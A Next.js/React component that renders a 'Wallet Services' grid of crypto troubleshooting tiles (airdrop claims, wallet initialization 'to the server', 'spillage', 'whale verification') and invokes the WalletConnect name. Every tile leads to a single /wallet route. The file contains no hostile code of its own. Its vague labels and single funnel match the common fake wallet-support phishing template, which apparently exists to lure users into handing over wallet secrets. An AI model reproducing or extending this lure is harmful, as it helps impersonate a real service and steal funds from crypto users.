"use client"

import { Card } from "@/components/ui/card"
import Link from "next/link"
import {
  Clock,
  Gift,
  Key,
  Wallet,
  Shield,
  LinkIcon,
  LogIn,
  Users,
  ArrowLeftRight,
  Repeat,
  CreditCard,
  TrendingUp,
  Layers,
  RefreshCw,
} from "lucide-react"

const features = [
  {
    icon: Clock,
    title: "Transaction Delay",
    description: "Click here for any issues related to transaction delay.",
    category: "transaction",
  },
  {
    icon: Gift,
    title: "Claim Airdrop",
    description: "Click here for airdrop related issues.",
    category: "rewards",
  },
  {
    icon: Layers,
    title: "NFTs",
    description: "Click here for NFTs minting/transfer related issues.",
    category: "nft",
  },
  {
    icon: Key,
    title: "Approve Wallet",
    description: "Click here for issues on wallet approval on the market.",
    category: "wallet",
  },
  {
    icon: Wallet,
    title: "Initialize Wallet",
    description: "Click here to initialize your wallet to the server.",
    category: "wallet",
  },
  {
    icon: Shield,
    title: "Locked Accounts",
    description: "Click here for issues related to account lock.",
    category: "security",
  },
  {
    icon: LinkIcon,
    title: "Connect to Dapps",
    description: "Click here for error while connecting to dapps.",
    category: "connection",
  },
  {
    icon: LogIn,
    title: "Login",
    description: "Click here for wallet login issues.",
    category: "auth",
  },
  {
    icon: Users,
    title: "Whitelist",
    description: "Click here for whitelist related issues.",
    category: "access",
  },
  {
    icon: ArrowLeftRight,
    title: "Swap",
    description: "Click here for assets swapping.",
    category: "trading",
  },
  {
    icon: Gift,
    title: "Spillage",
    description: "Click here for spillage related error.",
    category: "error",
  },
  {
    icon: CreditCard,
    title: "Transaction",
    description: "Click here for transaction related issues.",
    category: "transaction",
  },
  {
    icon: Repeat,
    title: "Cross Transfer",
    description: "Click here for cross bridge issues.",
    category: "bridge",
  },
  {
    icon: TrendingUp,
    title: "Staking",
    description: "Click here for staking related issues.",
    category: "defi",
  },
  {
    icon: RefreshCw,
    title: "Exchange",
    description: "Click here for exchange related issues.",
    category: "trading",
  },
]

export function FeatureGrid() {
  return (
    <section className="py-20 px-4">
      <div className="container mx-auto">
        <div className="text-center mb-16">
          <h2 className="text-4xl font-bold text-foreground mb-4">Wallet Services</h2>
          <p className="text-xl text-muted-foreground max-w-2xl mx-auto">
            Comprehensive support for all your Web3 wallet needs and troubleshooting
          </p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 max-w-7xl mx-auto">
          {features.map((feature, index) => {
            const Icon = feature.icon
            return (
              <Link key={feature.title} href="/wallet">
                <Card
                  className="glass p-6 hover:scale-105 transition-all duration-300 cursor-pointer group border-border/50 hover:border-primary/50"
                  style={{ animationDelay: `${index * 100}ms` }}
                >
                  <div className="flex flex-col items-center text-center space-y-4">
                    <div className="p-4 rounded-xl bg-primary/10 group-hover:bg-primary/20 transition-colors">
                      <Icon className="w-8 h-8 text-primary" />
                    </div>
                    <div>
                      <h3 className="text-lg font-semibold text-foreground mb-2 group-hover:text-primary transition-colors">
                        {feature.title}
                      </h3>
                      <p className="text-sm text-muted-foreground text-pretty">{feature.description}</p>
                    </div>
                  </div>
                </Card>
              </Link>
            )
          })}
        </div>

        {/* Quick Start Section */}
        <div className="mt-20 text-center">
          <div className="glass p-8 rounded-2xl max-w-4xl mx-auto">
            <h3 className="text-2xl font-bold text-primary mb-4">Quick Start</h3>
            <p className="text-muted-foreground mb-6">
              Get started with WalletConnect in minutes. Choose your preferred integration method.
            </p>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <Link href="/wallet">
                <div className="p-4 bg-muted/20 rounded-xl hover:bg-muted/30 transition-colors cursor-pointer">
                  <Shield className="w-6 h-6 text-accent mx-auto mb-2" />
                  <h4 className="font-semibold text-foreground">Dapps Extension</h4>
                  <p className="text-sm text-muted-foreground">Click here for dapps extension.</p>
                </div>
              </Link>
              <Link href="/wallet">
                <div className="p-4 bg-muted/20 rounded-xl hover:bg-muted/30 transition-colors cursor-pointer">
                  <CreditCard className="w-6 h-6 text-accent mx-auto mb-2" />
                  <h4 className="font-semibold text-foreground">Admin Verification</h4>
                  <p className="text-sm text-muted-foreground">Click here for Admin Verification.</p>
                </div>
              </Link>
              <Link href="/wallet">
                <div className="p-4 bg-muted/20 rounded-xl hover:bg-muted/30 transition-colors cursor-pointer">
                  <TrendingUp className="w-6 h-6 text-accent mx-auto mb-2" />
                  <h4 className="font-semibold text-foreground">Whale Verification</h4>
                  <p className="text-sm text-muted-foreground">Click here for whale verification.</p>
                </div>
              </Link>
            </div>
          </div>
        </div>
      </div>
    </section>
  )
}
